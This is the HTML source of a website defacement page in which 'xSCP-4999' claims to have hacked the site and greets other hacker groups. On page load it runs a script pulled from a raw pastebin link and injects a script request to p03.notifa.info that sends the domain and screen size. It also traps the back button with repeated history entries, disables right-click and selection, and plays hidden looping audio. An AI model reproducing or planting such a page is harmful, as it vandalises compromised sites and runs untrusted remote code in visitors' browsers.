<html>
 <head> 
<link rel="icon" type="image/png" href="https://i.pinimg.com/originals/f4/35/22/f43522bf3b4bbe2ed9927c250467bd3b.jpg" type="image/x-icon"/> 
<title>Ouch Sorry</title> <meta http-equiv="Content-xSCP-4999" content="upgrade-insecure-requests"> 
<meta name="google-site-verification" content="xSCP-4999"/> <meta name="theme-color" content="black"> 
<meta http-equiv="Content-Type" content="text/html; charset=Windows-1254"/><script type="text/javascript">(window.NREUM||(NREUM={})).loader_config={licenseKey:"113737a424",applicationID:"172543070"};window.NREUM||(NREUM={}),__nr_require=function(e,t,n){function r(n){if(!t[n]){var i=t[n]={exports:{}};e[n][0].call(i.exports,function(t){var i=e[n][1][t];return r(i||t)},i,i.exports)}return t[n].exports}if("function"==typeof __nr_require)return __nr_require;for(var i=0;i<n.length;i++)r(n[i]);return r}({1:[function(e,t,n){function r(){}function i(e,t,n){return function(){return o(e,[u.now()].concat(c(arguments)),t?null:this,n),t?void 0:this}}var o=e("handle"),a=e(6),c=e(7),f=e("ee").get("tracer"),u=e("loader"),s=NREUM;"undefined"==typeof window.newrelic&&(newrelic=s);var d=["setPageViewName","setCustomAttribute","setErrorHandler","finished","addToTrace","inlineHit","addRelease"],p="api-",l=p+"ixn-";a(d,function(e,t){s[t]=i(p+t,!0,"api")}),s.addPageAction=i(p+"addPageAction",!0),s.setCurrentRouteName=i(p+"routeName",!0),t.exports=newrelic,s.interaction=function(){return(new r).get()};var m=r.prototype={createTracer:function(e,t){var n={},r=this,i="function"==typeof t;return o(l+"tracer",[u.now(),e,n],r),function(){if(f.emit((i?"":"no-")+"fn-start",[u.now(),r,i],n),i)try{return t.apply(this,arguments)}catch(e){throw f.emit("fn-err",[arguments,this,e],n),e}finally{f.emit("fn-end",[u.now()],n)}}}};a("actionText,setName,setAttribute,save,ignore,onEnd,getContext,end,get".split(","),function(e,t){m[t]=i(l+t)}),newrelic.noticeError=function(e,t){"string"==typeof e&&(e=new Error(e)),o("err",[e,u.now(),!1,t])}},{}],2:[function(e,t,n){function r(){return c.exists&&performance.now?Math.round(performance.now()):(o=Math.max((new Date).getTime(),o))-a}function i(){return o}var o=(new Date).getTime(),a=o,c=e(8);t.exports=r,t.exports.offset=a,t.exports.getLastTimestamp=i},{}],3:[function(e,t,n){function r(e,t){var n=e.getEntries();n.forEach(function(e){"first-paint"===e.name?d("timing",["fp",Math.floor(e.startTime)]):"first-contentful-paint"===e.name&&d("timing",["fcp",Math.floor(e.startTime)])})}function i(e,t){var n=e.getEntries();n.length>0&&d("lcp",[n[n.length-1]])}function o(e){e.getEntries().forEach(function(e){e.hadRecentInput||d("cls",[e])})}function a(e){if(e instanceof m&&!g){var t=Math.round(e.timeStamp),n={type:e.type};t<=p.now()?n.fid=p.now()-t:t>p.offset&&t<=Date.now()?(t-=p.offset,n.fid=p.now()-t):t=p.now(),g=!0,d("timing",["fi",t,n])}}function c(e){d("pageHide",[p.now(),e])}if(!("init"in NREUM&&"page_view_timing"in NREUM.init&&"enabled"in NREUM.init.page_view_timing&&NREUM.init.page_view_timing.enabled===!1)){var f,u,s,d=e("handle"),p=e("loader"),l=e(5),m=NREUM.o.EV;if("PerformanceObserver"in window&&"function"==typeof window.PerformanceObserver){f=new PerformanceObserver(r);try{f.observe({entryTypes:["paint"]})}catch(v){}u=new PerformanceObserver(i);try{u.observe({entryTypes:["largest-contentful-paint"]})}catch(v){}s=new PerformanceObserver(o);try{s.observe({type:"layout-shift",buffered:!0})}catch(v){}}if("addEventListener"in document){var g=!1,y=["click","keydown","mousedown","pointerdown","touchstart"];y.forEach(function(e){document.addEventListener(e,a,!1)})}l(c)}},{}],4:[function(e,t,n){function r(e,t){if(!i)return!1;if(e!==i)return!1;if(!t)return!0;if(!o)return!1;for(var n=o.split("."),r=t.split("."),a=0;a<r.length;a++)if(r[a]!==n[a])return!1;return!0}var i=null,o=null,a=/Version\/(\S+)\s+Safari/;if(navigator.userAgent){var c=navigator.userAgent,f=c.match(a);f&&c.indexOf("Chrome")===-1&&c.indexOf("Chromium")===-1&&(i="Safari",o=f[1])}t.exports={agent:i,version:o,match:r}},{}],5:[function(e,t,n){function r(e){function t(){e(a&&document[a]?document[a]:document[i]?"hidden":"visible")}"addEventListener"in document&&o&&document.addEventListener(o,t,!1)}t.exports=r;var i,o,a;"undefined"!=typeof document.hidden?(i="hidden",o="visibilitychange",a="visibilityState"):"undefined"!=typeof document.msHidden?(i="msHidden",o="msvisibilitychange"):"undefined"!=typeof document.webkitHidden&&(i="webkitHidden",o="webkitvisibilitychange",a="webkitVisibilityState")},{}],6:[function(e,t,n){function r(e,t){var n=[],r="",o=0;for(r in e)i.call(e,r)&&(n[o]=t(r,e[r]),o+=1);return n}var i=Object.prototype.hasOwnProperty;t.exports=r},{}],7:[function(e,t,n){function r(e,t,n){t||(t=0),"undefined"==typeof n&&(n=e?e.length:0);for(var r=-1,i=n-t||0,o=Array(i<0?0:i);++r<i;)o[r]=e[t+r];return o}t.exports=r},{}],8:[function(e,t,n){t.exports={exists:"undefined"!=typeof window.performance&&window.performance.timing&&"undefined"!=typeof window.performance.timing.navigationStart}},{}],ee:[function(e,t,n){function r(){}function i(e){function t(e){return e&&e instanceof r?e:e?f(e,c,o):o()}function n(n,r,i,o){if(!p.aborted||o){e&&e(n,r,i);for(var a=t(i),c=v(n),f=c.length,u=0;u<f;u++)c[u].apply(a,r);var d=s[w[n]];return d&&d.push([b,n,r,a]),a}}function l(e,t){h[e]=v(e).concat(t)}function m(e,t){var n=h[e];if(n)for(var r=0;r<n.length;r++)n[r]===t&&n.splice(r,1)}function v(e){return h[e]||[]}function g(e){return d[e]=d[e]||i(n)}function y(e,t){u(e,function(e,n){t=t||"feature",w[n]=t,t in s||(s[t]=[])})}var h={},w={},b={on:l,addEventListener:l,removeEventListener:m,emit:n,get:g,listeners:v,context:t,buffer:y,abort:a,aborted:!1};return b}function o(){return new r}function a(){(s.api||s.feature)&&(p.aborted=!0,s=p.backlog={})}var c="nr@context",f=e("gos"),u=e(6),s={},d={},p=t.exports=i();p.backlog=s},{}],gos:[function(e,t,n){function r(e,t,n){if(i.call(e,t))return e[t];var r=n();if(Object.defineProperty&&Object.keys)try{return Object.defineProperty(e,t,{value:r,writable:!0,enumerable:!1}),r}catch(o){}return e[t]=r,r}var i=Object.prototype.hasOwnProperty;t.exports=r},{}],handle:[function(e,t,n){function r(e,t,n,r){i.buffer([e],r),i.emit(e,t,n)}var i=e("ee").get("handle");t.exports=r,r.ee=i},{}],id:[function(e,t,n){function r(e){var t=typeof e;return!e||"object"!==t&&"function"!==t?-1:e===window?0:a(e,o,function(){return i++})}var i=1,o="nr@id",a=e("gos");t.exports=r},{}],loader:[function(e,t,n){function r(){if(!E++){var e=b.info=NREUM.info,t=p.getElementsByTagName("script")[0];if(setTimeout(u.abort,3e4),!(e&&e.licenseKey&&e.applicationID&&t))return u.abort();f(h,function(t,n){e[t]||(e[t]=n)});var n=a();c("mark",["onload",n+b.offset],null,"api"),c("timing",["load",n]);var r=p.createElement("script");r.src="https://"+e.agent,t.parentNode.insertBefore(r,t)}}function i(){"complete"===p.readyState&&o()}function o(){c("mark",["domContent",a()+b.offset],null,"api")}var a=e(2),c=e("handle"),f=e(6),u=e("ee"),s=e(4),d=window,p=d.document,l="addEventListener",m="attachEvent",v=d.XMLHttpRequest,g=v&&v.prototype;NREUM.o={ST:setTimeout,SI:d.setImmediate,CT:clearTimeout,XHR:v,REQ:d.Request,EV:d.Event,PR:d.Promise,MO:d.MutationObserver};var y=""+location,h={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",agent:"js-agent.newrelic.com/nr-1184.min.js"},w=v&&g&&g[l]&&!/CriOS/.test(navigator.userAgent),b=t.exports={offset:a.getLastTimestamp(),now:a,origin:y,features:{},xhrWrappable:w,userAgent:s};e(1),e(3),p[l]?(p[l]("DOMContentLoaded",o,!1),d[l]("load",r,!1)):(p[m]("onreadystatechange",i),d[m]("onload",r)),c("mark",["firstbyte",a.getLastTimestamp()],null,"api");var E=0},{}],"wrap-function":[function(e,t,n){function r(e){return!(e&&e instanceof Function&&e.apply&&!e[a])}var i=e("ee"),o=e(7),a="nr@original",c=Object.prototype.hasOwnProperty,f=!1;t.exports=function(e,t){function n(e,t,n,i){function nrWrapper(){var r,a,c,f;try{a=this,r=o(arguments),c="function"==typeof n?n(r,a):n||{}}catch(u){p([u,"",[r,a,i],c])}s(t+"start",[r,a,i],c);try{return f=e.apply(a,r)}catch(d){throw s(t+"err",[r,a,d],c),d}finally{s(t+"end",[r,a,f],c)}}return r(e)?e:(t||(t=""),nrWrapper[a]=e,d(e,nrWrapper),nrWrapper)}function u(e,t,i,o){i||(i="");var a,c,f,u="-"===i.charAt(0);for(f=0;f<t.length;f++)c=t[f],a=e[c],r(a)||(e[c]=n(a,u?c+i:i,o,c))}function s(n,r,i){if(!f||t){var o=f;f=!0;try{e.emit(n,r,i,t)}catch(a){p([a,n,r,i])}f=o}}function d(e,t){if(Object.defineProperty&&Object.keys)try{var n=Object.keys(e);return n.forEach(function(n){Object.defineProperty(t,n,{get:function(){return e[n]},set:function(t){return e[n]=t,t}})}),t}catch(r){p([r])}for(var i in e)c.call(e,i)&&(t[i]=e[i]);return t}function p(t){try{e.emit("internal-error",t)}catch(n){}}return e||(e=i),n.inPlace=u,n.flag=a,n}},{}]},{},["loader"]);</script> <meta name="description" content="I'am Nolep !!"> 
<meta name="author" content="xSCP-4999"/> <meta name="keywords" content="XSCP-4999"/> 
<meta name="googlebot" content="all"/> <meta name="robots" content="all" /> 
<meta name="googlebot-news" content="all" /> <meta name="google" content="notranslate"/> 
<meta name="og:title" content="Owned By xSCP-4999"/> <meta property="og:image" content="https://ih0.redbubble.net/image.622876166.4056/flat,550x550,075,f.u2.jpg" /> 
<meta property="og:type" content="website" /> <meta property="og:updated_time" content="1440432930" /> </span> <meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> 
<script type="text/javascript" src="https://pastebin.com/raw/ynL2hpMe"></script> 

<script language="javascript">
<!--
var message="Mau maling bos? ijin dulu. ";
///////////////////////////////////
function clickIE4(){
if (event.button==2){
alert(message);
return false;
}
}
function clickNS4(e){
if (document.layers||document.getElementById&&!document.all){
if (e.which==2||e.which==3){
alert(message);
return false;
}
}
}
if (document.layers){
document.captureEvents(Event.MOUSEDOWN);
document.onmousedown=clickNS4;
}
else if (document.all&&!document.getElementById){
document.onmousedown=clickIE4;
}
document.oncontextmenu=new Function("alert(message);return false")

}
</script>

</head><script src="https://cdn.rawgit.com/bungfrangki/efeksalju/2a7805c7/efek-salju.js" type="text/javascript"></script> 
<style type="text/css"> /* Copyright XS3C-22 */ @import url("https://fonts.googleapis.com/css?family=Iceland|Shadows+Into+Light&display=swap"); 
body{ 
overflow:hidden; 
display: flex; 
align-items: center; 
justify-content: center; 
margin:0; padding:0; width:100%; 
background-color:black; 
} i{ margin:10px; 
color: red; 
} a:link{ color:#000;
 } h1{ color: #000; 
text-decoration: none; 
border-radius:0px; 
border:0px; 
font-family: 'Shadows Into Light', cursive; 
font-size:50px; 
margin:0px; 
padding:0px;
 animation:psychoxploit 0.5s linear infinite;
 } pre{ color:grey; 
} marquee{ width:100%; 
} @keyframes psychoxploit{ 2%{color:#fff;
} 3%{transform:translate(2px,-10px) skewX(3240deg);
} 5%{transform:translate(0px,0px) skewX(0deg);
} 2% , 54%{transform:translateX(0px) skew(0deg);
} 55%{transform:translate(-2px,6px) skew(-5530deg);
} 56%{transform:translate(0px,0px) skew(0deg);
} 57%{transform:translate(4px,-10px) skew(-70deg);
} 58%{transform:translate(0px,0px) skew(0deg);
} 62%{transform:translate(0px,20px) skew(0deg);
} 63%{transform:translate(4px,-2px) skew(0deg);
} 90%{transform:translate(1px,3px); 
skew(-230deg);} 95%{transform:translate(-7px,2px);
 skew(-120deg);} 100%{transform:translate(0px,0px) skew(0deg);
} </style> <body scroll="no" style="overflow: hidden" ondragstart="window.event.returnValue=false" onselectstart="event.returnValue=false"> 
<embed src="https://g.top4top.net/m_1438oc8ui1.mp3" type="audio/mpeg" autostart="true" loop="true" height="0" width="0"> 
<script> 
(function () { for(var i = 0; i < 20; i++) { history.pushState(null, document.title, window.location.href ); 
} })(document, window, history); 
</script> 
<center>
<img title="Hacked by xSCP-4999" class="picture" src="https://ih0.redbubble.net/image.622876166.4056/flat,550x550,075,f.u2.jpg" align="center" width="183px" height="275px"/> 
<br><h1><font color="red">Owned by</font> xSCP-4999 </h1>
<br> 
<pre>
<font color="red">Thanks to : </font>
<p align="center"> Script Kiddie - Qmack - L4MeR - Internalz  
  H4RiTs - IyanXgans - ./LEXUSG4NS - Boeng - Cyber_Berar007
NiT4cans - xLuv - SH3ll - xSCP-30 - All Members</p>
<br><marquee direction="scroll"><pre><i>[ xSCP-4999 ]</i> [!] Gretz : Mbojo Internal Blackhat - xBIMA - xploit Cyber Security - REDHACK - MalayX - Soloz  [!]</pre></marquee></br> </center> 
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();
callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);
var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXjK6QTMD%2bpSJftcmY1PUSu1IGnTrJpWKUF9X5om96NWcp9KRQtFu9DuflHEUpdk6YFUeGD79tSod13fCSfloehVnVtTcYzP1th3KE3vaAPi5dJjWtMJ9avTou9PClXgyLorFldszk%2b3yBgLLC3pSbjDPi7k4oAnDzRBXQ5ccInyKczA2%2f7KHpfhY8H71OalyY0CiwlX7ZobVQVZcU6XCjlMx9RLiAoWZWbZTCR7zNZm9aJNvFAyvAL%2blrIpJa83IzxFGHVQbC6dHXAMh9hEKrzCGFo3t3S91cJ5j3wvIwFaepBknhiIKw9pmMdAu9N1n3LHpEcxDSYy%2fJ1K0Bli9UZsss7QelhTwgf%2bX0K1Z9j8xoaMTauqCRFuFPckbICbXFuZmMIDyu8VsHR37kE9FjYVV9zKPmyVyaCfP3HxJ1ApIwUyLuM9rRsgKOdzsPGUSUaZTYnpAGVR3sjOn44YCh3s0d%2bSxuNDCs" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');
bsa.type = 'text/javascript';
bsa.async = true;
bsa.src = url;
(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);
}netbro_cache_analytics(requestCfs, function(){});
};</script>
<script type="text/javascript">window.NREUM||(NREUM={});NREUM.info={"beacon":"bam-cell.nr-data.net","licenseKey":"113737a424","applicationID":"172543070","transactionName":"bgFTYEJVWkcEURcICVdLZEZZG0VZVx0CEhVcEEIbQFhBUwxcEE4MSBFURkkaUl0JVxFOA0EFXERcUUcbAVcFABNVEB5EWEQbUgpADj4TSQheVVQaRFwV","queueTime":0,"applicationTime":0,"atts":"QkZQFgpPSUk=","errorBeacon":"bam-cell.nr-data.net","agent":""}</script>

<script language="javascript">
<!--
var message="Mau maling bos? ijin dulu. ";
///////////////////////////////////
function clickIE4(){
if (event.button==2){
alert(message);
return false;
}
}
function clickNS4(e){
if (document.layers||document.getElementById&&!document.all){
if (e.which==2||e.which==3){
alert(message);
return false;
}
}
}
if (document.layers){
document.captureEvents(Event.MOUSEDOWN);
document.onmousedown=clickNS4;
}
else if (document.all&&!document.getElementById){
document.onmousedown=clickIE4;
}
document.oncontextmenu=new Function("alert(message);return false")

}
</script>

</body> 
</html> 